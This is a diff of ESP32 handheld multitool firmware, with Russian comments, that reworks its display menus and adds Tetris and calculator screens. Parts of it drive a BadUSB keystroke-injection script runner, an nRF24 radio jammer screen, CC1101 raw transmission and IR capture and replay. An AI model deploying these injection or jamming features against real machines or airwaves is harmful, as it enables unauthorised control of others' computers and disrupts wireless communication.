+    if (cc1101_tx_index >= cc1101_tx_len) {
+        cc1101_transmit_stop();
+        return;
+    }
+    unsigned long now = micros();
+    if (now >= cc1101_tx_next_time) {
+        // Отправка одного байта (или нескольких)
+        ELECHOUSE_cc1101.SendData(&cc1101_tx_buffer[cc1101_tx_index], 1);
+        cc1101_tx_index++;
+        cc1101_tx_next_time = now + 100; // интервал 100 мкс
+    }
 }
 
-void cc1101_transmit_loop() {
-  if (!cc1101_transmitting) return;
-  if (cc1101_tx_index >= cc1101_tx_len) {
-    cc1101_transmit_stop();
-    return;
-  }
-  unsigned long now = micros();
-  if (now >= cc1101_tx_next_time) {
-    ELECHOUSE_cc1101.SendData(&cc1101_tx_buffer[cc1101_tx_index], 1);
-    cc1101_tx_index++;
-    cc1101_tx_next_time = now + 100;
-  }
-}
-void drawLedTimeoutMenu() {
-  display.clearDisplay();
-  drawHeader("LED Timeout");
-  int timeout = led_selected_device ? led_keyboard_timeout : led_board_timeout;
-  display.setCursor(10, 25);
-  display.print("Timeout: ");
-  if (timeout == 0) display.print("Always");
-  else display.print(timeout);
-  display.print(" sec");
-  display.setCursor(2, 56);
-  display.print("UP/DOWN=Change  OK=Save");
-  drawTopBarIcons();
-  display.display();
-}
-// ----------------------------------------------------------------------------
-// АДМИНИСТРАТИВНАЯ ПАНЕЛЬ
-// ----------------------------------------------------------------------------
 int editPinValue(const char* prompt) {
   consoleText = "";
   selectedKey = 0;
@@ -2304,7 +2758,6 @@ int editPinValue(const char* prompt) {
     delay(20);
   }
 }
-
 void changePins() {
   display.clearDisplay();
   drawHeader("Change pins");
@@ -2316,7 +2769,6 @@ void changePins() {
   display.display();
   delay(2000);
 }
-
 void setBrightness() {
   while (true) {
     display.clearDisplay();
@@ -2350,7 +2802,6 @@ void setBrightness() {
     delay(50);
   }
 }
-
 void setInvert() {
   displayInvert = !displayInvert;
   if (displayInvert) {
@@ -2365,19 +2816,18 @@ void setInvert() {
   display.display();
   delay(1000);
 }
-
 void showProcesses() {
   while (true) {
     display.clearDisplay();
     drawHeader("Processes");
     display.setCursor(2, 15);
-    display.printf("Heap free: %d KB", ESP.getFreeHeap() / 1024);
+    display.print("Heap free: " + String(ESP.getFreeHeap() / 1024) + " KB");
     display.setCursor(2, 25);
-    display.printf("Uptime: %d sec", millis() / 1000);
+    display.print("Uptime: " + String(millis() / 1000) + " sec");
     display.setCursor(2, 35);
-    display.printf("CPU freq: %d MHz", ESP.getCpuFreqMHz());
+    display.print("CPU freq: " + String(ESP.getCpuFreqMHz()) + " MHz");
     display.setCursor(2, 45);
-    display.printf("IR buffer: %d", irBufferSize);
+    display.print("IR buffer: " + String(irBufferSize));
     display.setCursor(2, 55);
     display.println("Press OK to exit");
     drawTopBarIcons();
@@ -2386,13 +2836,11 @@ void showProcesses() {
     delay(50);
   }
 }
-
 void reinitHardware() {
   Wire.begin(OLED_SDA, OLED_SCL);
   display.begin(SSD1306_SWITCHCAPVCC, OLED_ADDR);
   display.clearDisplay();
 }
-
 void drawAdminMenuHighlight(int sel) {
   display.clearDisplay();
   drawHeader("Admin Panel");
@@ -2413,7 +2861,6 @@ void drawAdminMenuHighlight(int sel) {
   drawTopBarIcons();
   display.display();
 }
-
 void adminPanel() {
   String pwd = inputStringWithKeyboard(true, "ENTER PASSWORD:");
   if (pwd == adminPassword && pwd != "") {
@@ -2463,9 +2910,6 @@ void adminPanel() {
   }
 }
 
-// ----------------------------------------------------------------------------
-// SD ИНФОРМАЦИЯ
-// ----------------------------------------------------------------------------
 void sdCardInfo() {
   String info = "";
   if (!SD.begin(SD_CS_PIN)) {
@@ -2486,10 +2930,6 @@ void sdCardInfo() {
   }
   showCommandOutput(info, 5);
 }
-
-// ----------------------------------------------------------------------------
-// ФУНКЦИЯ ДЛЯ КОМАНДЫ "fs" (LittleFS)
-// ----------------------------------------------------------------------------
 void fsManager() {
   if (!LittleFS.begin(true)) {
     showCommandOutput("LittleFS mount failed", 2);
@@ -2602,23 +3042,19 @@ void fsManager() {
   drawKeyboard();
   needRedraw = true;
 }
-// ----------------------------------------------------------------------------
-// BadUSB: парсер и выполнение
-// ----------------------------------------------------------------------------
+
 void badUsbSendKey(uint8_t key, uint8_t modifiers) {
     if (modifiers) Keyboard.press(modifiers);
     Keyboard.press(key);
     delay(10);
     Keyboard.releaseAll();
 }
-
 void badUsbSendString(const String& text) {
     for (char c : text) {
         Keyboard.write(c);
         delay(5);
     }
 }
-
 void badUsbDelay(unsigned long ms) {
     unsigned long start = millis();
     while (millis() - start < ms) {
@@ -2626,7 +3062,6 @@ void badUsbDelay(unsigned long ms) {
         if (!badUsbRunning) break;
     }
 }
-
 bool executeBadUsbLine(String line) {
     line.trim();
     if (line.startsWith("REM") || line.isEmpty()) return true;
@@ -2682,12 +3117,10 @@ bool executeBadUsbLine(String line) {
         return true;
     }
     if (line.startsWith("SHIFT ")) {
-        // добавить по необходимости
         return true;
     }
     return true;
 }
-
 void badUsbRunScript(const String& script) {
     if (badUsbRunning) return;
     badUsbRunning = true;
@@ -2711,7 +3144,6 @@ void badUsbRunScript(const String& script) {
     showMsg("Script finished");
     Serial.println("BadUSB script finished");
 }
-
 void badUsbRunFile(const String& filename) {
     if (!SD.begin(SD_CS_PIN)) {
         showMsg("SD error");
@@ -2726,14 +3158,11 @@ void badUsbRunFile(const String& filename) {
     file.close();
     badUsbRunScript(script);
 }
-
 void badUsbRunBuiltin(int index) {
     if (index < 0 || index >= badUsbBuiltinCount) return;
     badUsbRunScript(String(badUsbBuiltinScripts[index]));
 }
-// ----------------------------------------------------------------------------
-// ОБРАБОТКА ДОЛГОГО НАЖАТИЯ КНОПОК
-// ----------------------------------------------------------------------------
+
 void handleButtons() {
   static bool okWasPressed = false;
   static unsigned long longPressStart = 0;
@@ -2744,21 +3173,16 @@ void handleButtons() {
   }
   if (okNow && okWasPressed && (millis() - longPressStart) >= LONG_PRESS_MS && !longPressDetected) {
     longPressDetected = true;
-    if (appState == STATE_NRF24_JAMMER && nrfOk) {
-      if (jamming) {
-        stopJammer();
-        appState = STATE_NRF24_MENU;
-        needRedraw = true;
-        okWasPressed = false;
-        longPressDetected = false;
-        return;
-      } else {
-        jammerMode = (jammerMode == BLE_JAMMER_MODE) ? BLUETOOTH_JAMMER_MODE : BLE_JAMMER_MODE;
-        if (jammerMode == BLE_JAMMER_MODE) showMsg("Mode: BLE");
-        else showMsg("Mode: Bluetooth");
-        needRedraw = true;
-      }
-    }
+if (appState == STATE_NRF24_JAMMER && nrfOk) {
+  if (jamming) {
+    stopJammer();
+    appState = STATE_NRF24_MENU;
+    needRedraw = true;
+    okWasPressed = false;
+    longPressDetected = false;
+    return;
+  }
+}
     delay(200);
     okWasPressed = false;
     longPressDetected = false;
@@ -2773,9 +3197,6 @@ void handleButtons() {
   }
 }
 
-// ----------------------------------------------------------------------------
-// WI-FI ЧАТ: ВЕБ-СТРАНИЦА И WEBSOCKET
-// ----------------------------------------------------------------------------
 const char CHAT_PAGE[] PROGMEM = R"rawliteral(
 <!DOCTYPE html>
 <html>
@@ -2886,7 +3307,6 @@ void webSocketEvent(uint8_t num, WStype_t type, uint8_t * payload, size_t length
     default: break;
   }
 }
-
 void startWiFiChat() {
   if (!chatActive) {
     server.on("/", []() { server.send(200, "text/html", CHAT_PAGE); });
@@ -2897,7 +3317,6 @@ void startWiFiChat() {
     Serial.println("Chat server started");
   }
 }
-
 void stopWiFiChat() {
   if (chatActive) {
     server.stop();
@@ -2907,7 +3326,6 @@ void stopWiFiChat() {
   }
 }
 
-// =========================== ДОПОЛНИТЕЛЬНЫЕ ФУНКЦИИ ОТРИСОВКИ ===========================
 void drawWifiScan() {
   display.clearDisplay();
   drawHeader("WiFi Scan");
@@ -2968,7 +3386,6 @@ void drawWifiScan() {
   drawTopBarIcons();
   display.display();
 }
-
 void drawNrfSpectrum() {
   display.clearDisplay();
   drawHeader("nRF Spectrum");
@@ -2981,18 +3398,16 @@ void drawNrfSpectrum() {
     return;
   }
 
-  // Выводим параметры канала и сигнала сразу под заголовком
   display.setCursor(2, 14);
-  display.printf("CH:%d  %dMHz", currentNrfChan, 2400 + currentNrfChan);
+  display.print("CH:" + String(currentNrfChan) + "  " + String(2400 + currentNrfChan) + "MHz");
   display.setCursor(90, 14);
-  display.printf("SIG:%d", nrfSmooth[currentNrfChan]);
+  display.print("SIG:" + String(nrfSmooth[currentNrfChan]));
 
-  // График рисуется ниже (y от 24 до 63, высота 40 пикселей)
   const int graphTop = 24;
   const int graphBottom = 63;
   for (int x = 0; x < 128; x++) {
     int h = nrf_spectrum_history[x];
-    if (h > 40) h = 40;               // ограничиваем, чтобы не вылезти за область графика
+    if (h > 40) h = 40;
     if (h > 0) {
       display.drawFastVLine(x, graphBottom - h, h, SSD1306_WHITE);
     }
@@ -3001,7 +3416,6 @@ void drawNrfSpectrum() {
   drawTopBarIcons();
   display.display();
 }
-
 void drawNrfJammer() {
   display.clearDisplay();
   if (!nrfOk) {
@@ -3012,51 +3426,53 @@ void drawNrfJammer() {
     display.display();
     return;
   }
-  char h[30];
-  sprintf(h, "%s Jam", jammerMode == BLE_JAMMER_MODE ? "BLE" : "BT");
-  drawHeader(h);
+  drawHeader("nRF Jammer");
   if (jamming) {
     display.setTextSize(2);
     display.setCursor(20, 20);
     display.println("JAMMING");
     display.setTextSize(1);
     display.setCursor(2, 40);
-    display.printf("Ch:%d  %dMHz", currentNrfChan, 2400 + currentNrfChan);
+    display.print("Ch:" + String(currentNrfChan) + "  " + String(2400 + currentNrfChan) + "MHz");
     display.setCursor(2, 52);
     display.println("Hold OK to stop");
   } else {
-    display.setCursor(15, 25);
-    display.printf("Mode: %s", jammerMode == BLE_JAMMER_MODE ? "BLE" : "Bluetooth");
-    display.setCursor(15, 37);
-    display.printf("nRF24: READY");
-    display.setCursor(15, 49);
+    display.setCursor(15, 30);
+    display.print("nRF24: READY");
+    display.setCursor(15, 45);
     display.print("Press start");
     display.setCursor(2, 60);
-    display.print("Hold OK=change");
+    display.print("Hold OK=exit");
   }
   drawTopBarIcons();
   display.display();
 }
-
 void drawIrCapture() {
-  display.clearDisplay();
-  drawHeader("IR Capture");
-  if (irCapturing) {
-    if (irTempReady) display.setCursor(20, 30);
-    else display.setCursor(25, 30);
-    display.println(irTempReady ? "Captured!" : "Listening...");
-    display.setCursor(15, 42);
-    display.printf("Timeout: %ds", (irTimeout - millis()) / 1000);
-  } else {
-    display.setCursor(30, 30);
-    display.println("Press start");
-  }
-  display.setCursor(2, 56);
-  display.println("Press=save");
-  drawTopBarIcons();
-  display.display();
+    display.clearDisplay();
+    drawHeader("IR Capture");
+    if (irCapturing) {
+        if (irTempReady) {
+            display.setCursor(10, 20);
+            display.print("Captured!");
+            display.setCursor(10, 30);
+            display.print("Proto: " + tempProto);
+            display.setCursor(10, 40);
+            display.print("Len: " + String(tempRawLen));
+        } else {
+            display.setCursor(20, 30);
+            display.println("Listening...");
+            display.setCursor(15, 42);
+            display.print("Timeout: " + String((irTimeout - millis()) / 1000) + "s");
+        }
+    } else {
+        display.setCursor(30, 30);
+        display.println("Press start");
+    }
+    display.setCursor(2, 56);
+    display.println("OK=save, BACK=cancel");
+    drawTopBarIcons();
+    display.display();
 }
-
 void drawIrTransmit() {
   display.clearDisplay();
   drawHeader("IR Transmit");
@@ -3071,7 +3487,7 @@ void drawIrTransmit() {
       display.setTextColor(SSD1306_WHITE);
     }
     display.setCursor(12, y);
-    display.printf("Slot %d: %s", i, irSlots[i].isValid ? "OK" : "Empty");
+    display.print("Slot " + String(i) + ": " + (irSlots[i].isValid ? "OK" : "Empty"));
   }
   int yb = 14 + IR_SLOTS_COUNT * 10;
   if (irTxScroll == IR_SLOTS_COUNT) {
@@ -3087,22 +3503,20 @@ void drawIrTransmit() {
   drawTopBarIcons();
   display.display();
 }
-
 void drawTimeoutMenu() {
   display.clearDisplay();
   drawHeader("Display Timeout");
-  const char* opts[] = {"Off", "10s", "30s", "1min", "5min"};
-  int vals[] = {0, 10, 30, 60, 300};
+  const char* opts[] = {"Off", "10s", "30s", "1min", "2min", "5min", "10min", "30min"};
+  int vals[] = {0, 10, 30, 60, 120, 300, 600, 1800};
   int idx = 0;
-  for (int i = 0; i < 5; i++) if (vals[i] == timeoutVal) idx = i;
+  for (int i = 0; i < 8; i++) if (vals[i] == timeoutVal) idx = i;
   display.setCursor(30, 30);
-  display.printf("Timeout: %s", opts[idx]);
+  display.print("Timeout: " + String(opts[idx]));
   display.setCursor(2, 56);
   display.println("UP/DOWN=chg  OK=save");
   drawTopBarIcons();
   display.display();
 }
-
 void drawResetConfirm() {
   display.clearDisplay();
   drawHeader("Reset Device!");
@@ -3113,7 +3527,6 @@ void drawResetConfirm() {
   drawTopBarIcons();
   display.display();
 }
-
 void drawRebootConfirm() {
   display.clearDisplay();
   drawHeader("Reboot");
@@ -3124,7 +3537,6 @@ void drawRebootConfirm() {
   drawTopBarIcons();
   display.display();
 }
-
 void drawChatKeyboard() {
   display.clearDisplay();
   display.drawRect(0, 0, 128, 10, WHITE);
@@ -3157,7 +3569,23 @@ void drawChatKeyboard() {
   }
   display.display();
 }
-
+void updateTimeout(Button btn) {
+  const int vals[] = {0, 10, 30, 60, 120, 300, 600, 1800};
+  const int sz = 8;
+  int idx = 0;
+  for (int i = 0; i < sz; i++) if (vals[i] == timeoutVal) idx = i;
+  if (btn == BTN_UP) idx = (idx - 1 + sz) % sz;
+  else if (btn == BTN_DOWN) idx = (idx + 1) % sz;
+  else if (btn == BTN_OK) {
+    displayTimeoutSec = timeoutVal = vals[idx];
+    saveTimeout();
+    appState = STATE_SETTINGS_MENU;
+    needRedraw = true;
+    return;
+  }
+  timeoutVal = vals[idx];
+  needRedraw = true;
+}
 void drawKeyboard() {
   display.clearDisplay();
   display.drawRect(0, 0, 128, 10, WHITE);
@@ -3191,9 +3619,9 @@ void drawKeyboard() {
 void drawBatteryIcon(int x, int y) {
   int width = 16;
   int height = 8;
-  int percent = (batteryRemaining / batteryCapacity) * 100;
-  if (percent < 0) percent = 0;
-  if (percent > 100) percent = 100;
+int percent = (batteryRemaining / batteryCapacity) * 100;
+if (percent > 100) percent = 100;
+if (percent < 0) percent = 0;
   display.setTextSize(1);
   String percentStr = String(percent) + "%";
   int16_t x1, y1;
@@ -3210,19 +3638,62 @@ void drawBatteryIcon(int x, int y) {
     display.fillRect(x + 1, y + 1, fillWidth, height - 2, SSD1306_WHITE);
   }
 }
-
 void drawTopBarIcons() {
-  int x = SCREEN_WIDTH - 16;
   int y = 2;
-  if (WiFi.status() == WL_CONNECTED) {
-    drawWiFiIcon(x, y);
-    x -= (16 + 20);
-  } else {
-    x = SCREEN_WIDTH - 16 - 20 - 16;
-  }
-  drawBatteryIcon(x, y);
-}
+  int x = SCREEN_WIDTH;
 
+  auto textWidth = [](const char* txt) {
+    int16_t x1, y1;
+    uint16_t w, h;
+    display.getTextBounds(txt, 0, 0, &x1, &y1, &w, &h);
+    return w;
+  };
+
+  bool hasWifi = (WiFi.status() == WL_CONNECTED);
+  if (hasWifi) {
+    x -= 16;
+    drawWiFiIcon(x, y);
+    x -= 10;
+  }
+
+  x -= 16;
+  int batX = x;
+  int batY = y;
+  display.drawRect(batX, batY, 16, 8, SSD1306_WHITE);
+  display.fillRect(batX + 16, batY + 2, 2, 4, SSD1306_WHITE);
+  int percent = (batteryRemaining / batteryCapacity) * 100;
+  if (percent > 100) percent = 100;
+  if (percent < 0) percent = 0;
+  int fillWidth = map(percent, 0, 100, 0, 14);
+  if (fillWidth > 0) {
+    display.fillRect(batX + 1, batY + 1, fillWidth, 6, SSD1306_WHITE);
+  }
+
+  x -= 3;
+
+  String percentStr = String(percent) + "%";
+  int16_t x1, y1;
+  uint16_t w, h;
+  display.getTextBounds(percentStr, 0, 0, &x1, &y1, &w, &h);
+  x -= w;
+  display.setCursor(x, y);
+  display.print(percentStr);
+
+  x -= 3;
+
+bool hasCharge = isCharging;
+if (hasCharge) { 
+  int boltX = x - 8;
+  int boltY = y;
+
+  display.drawLine(boltX + 4, boltY + 0, boltX + 1, boltY + 4, SSD1306_WHITE);
+  display.drawLine(boltX + 1, boltY + 4, boltX + 3, boltY + 4, SSD1306_WHITE);
+  display.drawLine(boltX + 3, boltY + 4, boltX + 2, boltY + 8, SSD1306_WHITE);
+  display.drawLine(boltX + 2, boltY + 8, boltX + 7, boltY + 3, SSD1306_WHITE);
+  display.drawLine(boltX + 7, boltY + 3, boltX + 5, boltY + 3, SSD1306_WHITE);
+  display.drawLine(boltX + 5, boltY + 3, boltX + 4, boltY + 0, SSD1306_WHITE);
+}
+}
 void drawWifiSpectrum() {
   display.clearDisplay();
   drawHeader("WiFi Spectrum");
@@ -3236,33 +3707,31 @@ void drawWifiSpectrum() {
   }
   display.drawLine(0, 48, SCREEN_WIDTH, 48, SSD1306_WHITE);
   display.setCursor(2, 52);
-  display.printf("Ch:%d", currentWifiChan);
+  display.print("Ch:" + String(currentWifiChan));
   display.setCursor(70, 52);
-  display.printf("Pkt:%d", totalPackets);
+  display.print("Pkt:" + String(totalPackets));
   drawTopBarIcons();
   display.display();
 }
-
 void drawWifiInfo() {
   display.clearDisplay();
   drawHeader("Net Info");
   if (wifiSelectedIdx >= 0 && wifiSelectedIdx < (int)wifiList.size()) {
     WiFiNetworkInfo& n = wifiList[wifiSelectedIdx];
     display.setCursor(2, 14);
-    display.printf("SSID: %s", n.ssid.substring(0, 13).c_str());
+    display.print("SSID: " + n.ssid.substring(0, 13));
     display.setCursor(2, 24);
-    display.printf("Ch: %d", n.channel);
+    display.print("Ch: " + String(n.channel));
     display.setCursor(2, 34);
-    display.printf("RSSI: %d dBm", n.rssi);
+    display.print("RSSI: " + String(n.rssi) + " dBm");
     display.setCursor(2, 44);
-    display.printf("Sec: %s", n.encryptionType.c_str());
+    display.print("Sec: " + n.encryptionType);
   }
   display.setCursor(2, 56);
   display.print("Press=back");
   drawTopBarIcons();
   display.display();
 }
-
 void drawWifiConnecting() {
   display.clearDisplay();
   drawHeader("Connect WiFi");
@@ -3301,7 +3770,6 @@ void drawWifiConnecting() {
   drawTopBarIcons();
   display.display();
 }
-
 void drawFactoryResetConfirm() {
   display.clearDisplay();
   drawHeader("FACTORY RESET");
@@ -3312,25 +3780,24 @@ void drawFactoryResetConfirm() {
   drawTopBarIcons();
   display.display();
 }
-
 void drawStorageInfo() {
   display.clearDisplay();
   drawHeader("Storage");
   int y = 14;
   display.setCursor(2, y); y += 10;
-  display.printf("Flash: %d MB", ESP.getFlashChipSize() / (1024*1024));
+  display.print("Flash: " + String(ESP.getFlashChipSize() / (1024*1024)) + " MB");
   display.setCursor(2, y); y += 10;
-  display.printf("Free Heap: %d KB", ESP.getFreeHeap() / 1024);
+  display.print("Free Heap: " + String(ESP.getFreeHeap() / 1024) + " KB");
   display.setCursor(2, y); y += 10;
   if (SD.begin(SD_CS_PIN, SPI, 4000000)) {
     uint64_t cardSize = SD.cardSize() / (1024*1024);
     uint64_t used = SD.usedBytes() / (1024*1024);
     uint64_t total = SD.totalBytes() / (1024*1024);
-    display.printf("SD Card: %d MB", cardSize);
+    display.print("SD Card: " + String(cardSize) + " MB");
     display.setCursor(2, y); y += 10;
-    display.printf("Used: %d MB", used);
+    display.print("Used: " + String(used) + " MB");
     display.setCursor(2, y); y += 10;
-    display.printf("Free: %d MB", total - used);
+    display.print("Free: " + String(total - used) + " MB");
     SD.end();
   } else {
     display.println("SD Card: ERROR");
@@ -3340,422 +3807,560 @@ void drawStorageInfo() {
   drawTopBarIcons();
   display.display();
 }
+void drawTetrisGame() {
+  display.clearDisplay();
+  drawHeader("Tetris");
 
-// ==================== LED функции ====================
-void saveLedSettings() {
-  Preferences pref;
-  pref.begin("led", false);
-  pref.putInt("board_color", led_board_colorIdx);
-  pref.putInt("board_bright", led_board_brightness);
-  pref.putInt("board_effect", led_board_effect);
-  pref.putInt("board_timeout", led_board_timeout);
-  pref.putInt("key_color", led_keyboard_colorIdx);
-  pref.putInt("key_bright", led_keyboard_brightness);
-  pref.putInt("key_effect", led_keyboard_effect);
-  pref.putInt("key_timeout", led_keyboard_timeout);
-  pref.end();
+  if (tetrisGameOver) {
+    display.setCursor(30, 30);
+    display.print("Game Over");
+    display.setCursor(20, 45);
+    display.print("Score: ");
+    display.print(tetrisScore);
+    display.setCursor(10, 55);
+    display.print("OK=restart, Up/Down=exit");
+    drawTopBarIcons();
+    display.display();
+    if (btnOk()) {
+      memset(tetrisField, 0, sizeof(tetrisField));
+      tetrisScore = 0;
+      tetrisLines = 0;
+      tetrisGameOver = false;
+      spawnPiece();
+      needRedraw = true;
+    }
+    if (btnUp() || btnDown()) {
+      appState = STATE_APPS_MENU;
+      needRedraw = true;
+    }
+    return;
+  }
+
+  // === Управление ===
+  // Движение влево/вправо с автоповтором
+  static unsigned long lastMoveTime = 0;
+  static bool moveHeld = false;
+  static int moveDir = 0; // -1 влево, 1 вправо
+
+  if (btnUp()) {
+    if (!moveHeld) {
+      moveHeld = true;
+      moveDir = -1;
+      lastMoveTime = millis();
+      int newX = currentPiece.x - 1;
+      if (!collision(currentPiece.type, currentPiece.rotation, newX, currentPiece.y)) {
+        currentPiece.x = newX;
+        needRedraw = true;
+      }
+    } else if (millis() - lastMoveTime > 150) {
+      lastMoveTime = millis();
+      int newX = currentPiece.x - 1;
+      if (!collision(currentPiece.type, currentPiece.rotation, newX, currentPiece.y)) {
+        currentPiece.x = newX;
+        needRedraw = true;
+      }
+    }
+  } else if (btnDown()) {
+    if (!moveHeld) {
+      moveHeld = true;
+      moveDir = 1;
+      lastMoveTime = millis();
+      int newX = currentPiece.x + 1;
+      if (!collision(currentPiece.type, currentPiece.rotation, newX, currentPiece.y)) {
+        currentPiece.x = newX;
+        needRedraw = true;
+      }
+    } else if (millis() - lastMoveTime > 150) {
+      lastMoveTime = millis();
+      int newX = currentPiece.x + 1;
+      if (!collision(currentPiece.type, currentPiece.rotation, newX, currentPiece.y)) {
+        currentPiece.x = newX;
+        needRedraw = true;
+      }
+    }
+  } else {
+    moveHeld = false;
+  }
+
+  // Обработка OK: поворот, ускорение, выход по длительному нажатию
+  static unsigned long okHoldStart = 0;
+  static bool okHeld = false;
+
+  if (btnOk()) {
+    if (!okHeld) {
+      okHeld = true;
+      okHoldStart = millis();
+      // Поворот
+      int newRot = (currentPiece.rotation + 1) % 4;
+      if (!collision(currentPiece.type, newRot, currentPiece.x, currentPiece.y)) {
+        currentPiece.rotation = newRot;
+        needRedraw = true;
+      }
+    } else {
+      // Удержание: ускоренное падение (после 200 мс)
+      if (millis() - okHoldStart > 200) {
+        if (!collision(currentPiece.type, currentPiece.rotation, currentPiece.x, currentPiece.y + 1)) {
+          currentPiece.y++;
+          needRedraw = true;
+        }
+      }
+      // Выход при удержании 2 секунды
+      if (millis() - okHoldStart > 2000) {
+        appState = STATE_APPS_MENU;
+        needRedraw = true;
+        okHeld = false;
+        return;
+      }
+    }
+  } else {
+    okHeld = false;
+  }
+
+  // Падение по таймеру
+  if (millis() - tetrisLastDrop > tetrisDropInterval) {
+    tetrisLastDrop = millis();
+    if (!collision(currentPiece.type, currentPiece.rotation, currentPiece.x, currentPiece.y + 1)) {
+      currentPiece.y++;
+      needRedraw = true;
+    } else {
+      lockPiece();
+      clearLines();
+      spawnPiece();
+      if (collision(currentPiece.type, currentPiece.rotation, currentPiece.x, currentPiece.y)) {
+        tetrisGameOver = true;
+        needRedraw = true;
+      }
+      needRedraw = true;
+    }
+  }
+
+  // Отрисовка поля
+  for (int row = 0; row < TETRIS_HEIGHT; row++) {
+    for (int col = 0; col < TETRIS_WIDTH; col++) {
+      if (tetrisField[row][col]) {
+        display.fillRect(col * 4 + 10, row * 3 + 14, 4, 3, SSD1306_WHITE);
+      }
+    }
+  }
+  drawPiece(currentPiece.type, currentPiece.rotation, currentPiece.x, currentPiece.y);
+  display.setCursor(2, 14);
+  display.print("Score: ");
+  display.print(tetrisScore);
+  drawTopBarIcons();
+  display.display();
+}
+void drawCalculator() {
+  display.clearDisplay();
+  display.drawRect(0, 0, 128, 10, WHITE);
+  display.setCursor(2, 2);
+  // отображение выражения и результата
+  String displayText = calcExpression;
+  if (calcResult != "") displayText += " = " + calcResult;
+  if (displayText.length() > 20) displayText = displayText.substring(displayText.length()-20);
+  display.print(displayText);
+
+  int cols = 5;
+  int rows = 4; // плюс строка для Exit? можно сделать 5 строк
+  // расположим клавиши в 4 строки по 5, последняя строка - только Exit? 
+  // У нас 21 клавиша: 4 строки по 5 = 20, и Exit отдельно. Можно сделать 5 строк: 4 строки по 5, пятая строка с Exit и пустыми.
+  // Но для упрощения сделаем 5 столбцов и 5 строк (последняя строка: только Exit, остальные пустые).
+  int keyW = 24, keyH = 10;
+  int startX = 2, startY = 14;
+  int spacing = 2;
+  for (int row = 0; row < 5; row++) {
+    for (int col = 0; col < 5; col++) {
+      int idx = row * 5 + col;
+      if (idx >= calcKeysCount) break;
+      int x = startX + col * (keyW + spacing);
+      int y = startY + row * (keyH + spacing);
+      if (idx == calcSelectedKey) {
+        display.fillRect(x, y, keyW, keyH, WHITE);
+        display.setTextColor(BLACK);
+      } else {
+        display.setTextColor(WHITE);
+      }
+      display.setCursor(x + 4, y + 2);
+      display.print(calcKeyLabels[idx]);
+    }
+  }
+
+  drawTopBarIcons();
+  display.display();
 }
 
+void saveLedSettings() {
+    Preferences pref;
+    pref.begin("led", false);
+    pref.putInt("board_color", led_board_colorIdx);
+    pref.putInt("board_bright", led_board_brightness);
+    pref.putInt("board_effect", led_board_effect);
+    pref.putInt("board_timeout", led_board_timeout);
+    pref.putInt("key_color", led_keyboard_colorIdx);
+    pref.putInt("key_bright", led_keyboard_brightness);
+    pref.putInt("key_effect", led_keyboard_effect);
+    pref.putInt("key_timeout", led_keyboard_timeout);
+    pref.end();
+}
 void loadLedSettings() {
-  Preferences pref;
-  pref.begin("led", true);
-  led_board_colorIdx = pref.getInt("board_color", 0);
-  led_board_brightness = pref.getInt("board_bright", 50);
-  led_board_effect = pref.getInt("board_effect", 0);
-  led_board_timeout = pref.getInt("board_timeout", 0);
-  led_keyboard_colorIdx = pref.getInt("key_color", 0);
-  led_keyboard_brightness = pref.getInt("key_bright", 50);
-  led_keyboard_effect = pref.getInt("key_effect", 0);
-  led_keyboard_timeout = pref.getInt("key_timeout", 0);
-  pref.end();
+    Preferences pref;
+    pref.begin("led", true);
+    led_board_colorIdx = pref.getInt("board_color", 0);
+    led_board_brightness = pref.getInt("board_bright", 50);
+    led_board_effect = pref.getInt("board_effect", 0);
+    led_board_timeout = pref.getInt("board_timeout", 0);
+    led_keyboard_colorIdx = pref.getInt("key_color", 0);
+    led_keyboard_brightness = pref.getInt("key_bright", 50);
+    led_keyboard_effect = pref.getInt("key_effect", 0);
+    led_keyboard_timeout = pref.getInt("key_timeout", 0);
+    pref.end();
 }
 
 void drawLedSelectDevice() {
-  display.clearDisplay();
-  drawHeader("LED Device");
-  const char* items[] = {"Board LED", "Keyboard LED", "Back"};
-  int startX = 30;   // отступ слева для стрелки
-  int textX = 45;    // отступ для текста
-  for (int i = 0; i < 3; i++) {
-    int y = 20 + i * 12;  // чуть ниже, чтобы не перекрывать заголовок
-    if (i == led_submenu_idx) {
-      // Закрашиваем только область под текстом (не всю ширину)
-      int16_t x1, y1;
-      uint16_t w, h;
-      display.getTextBounds(items[i], 0, 0, &x1, &y1, &w, &h);
-      display.fillRect(textX - 2, y - 1, w + 16, h + 2, SSD1306_WHITE);
-      display.setTextColor(SSD1306_BLACK);
-      display.setCursor(startX, y);
-      display.print(">");
-    } else {
-      display.setTextColor(SSD1306_WHITE);
+    display.clearDisplay();
+    drawHeader("LED Device");
+    const char* items[] = {"Board LED", "Keyboard LED", "Back"};
+    for (int i = 0; i < 3; i++) {
+        drawItem(items[i], i == led_submenu_idx, i);
     }
-    display.setCursor(textX, y);
-    display.print(items[i]);
-  }
-  drawTopBarIcons();
-  display.display();
+    drawTopBarIcons();
+    display.display();
 }
-
 void drawLedMainMenu() {
-  display.clearDisplay();
-  char title[20];
-  sprintf(title, "%s LED", led_selected_device ? "Keyboard" : "Board");
-  drawHeader(title);
-  const char* items[] = {"Color", "Effect", "Timeout", "Back"};
-  int startX = 30;
-  int textX = 45;
-  for (int i = 0; i < 4; i++) {
-    int y = 20 + i * 12;
-    if (i == led_submenu_idx) {
-      int16_t x1, y1;
-      uint16_t w, h;
-      display.getTextBounds(items[i], 0, 0, &x1, &y1, &w, &h);
-      display.fillRect(textX - 2, y - 1, w + 16, h + 2, SSD1306_WHITE);
-      display.setTextColor(SSD1306_BLACK);
-      display.setCursor(startX, y);
-      display.print(">");
-    } else {
-      display.setTextColor(SSD1306_WHITE);
+    display.clearDisplay();
+    char title[20];
+    sprintf(title, "%s LED", led_selected_device ? "Keyboard" : "Board");
+    drawHeader(title);
+    const char* items[] = {"Color", "Effect", "Brightness", "Timeout", "Back"};
+    for (int i = 0; i < 5; i++) {
+        drawItem(items[i], i == led_submenu_idx, i);
     }
-    display.setCursor(textX, y);
-    display.print(items[i]);
-  }
-  drawTopBarIcons();
-  display.display();
+    drawTopBarIcons();
+    display.display();
 }
-
 void drawLedColorMenu() {
-  display.clearDisplay();
-  drawHeader("Select Color");
+    display.clearDisplay();
+    drawHeader("Select Color");
+    int colorIdx = led_selected_device ? led_keyboard_colorIdx : led_board_colorIdx;
+    int brightness = led_selected_device ? led_keyboard_brightness : led_board_brightness;
 
-  int colorIdx = led_selected_device ? led_keyboard_colorIdx : led_board_colorIdx;
-  int brightness = led_selected_device ? led_keyboard_brightness : led_board_brightness;
+    uint32_t col = colorPalette[colorIdx];
+    display.fillRect(100, 2, 26, 10, SSD1306_BLACK);
+    display.fillRect(100, 2, 26, 10, col);
